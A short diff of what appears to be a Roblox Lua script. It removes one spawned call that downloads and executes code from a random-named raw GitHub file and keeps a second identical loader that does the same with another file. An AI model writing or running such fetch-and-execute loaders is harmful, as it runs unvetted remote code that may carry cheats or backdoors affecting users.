@@ -20,9 +20,5 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/bwixauxnn3366265894447/xcvd4ccss566532/refs/heads/main/Faa_VARRRR"))()
-end)
-
-task.spawn(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/bwixauxnn3366265894447/xcvd4ccss566532/refs/heads/main/xx112512252"))()
 end)
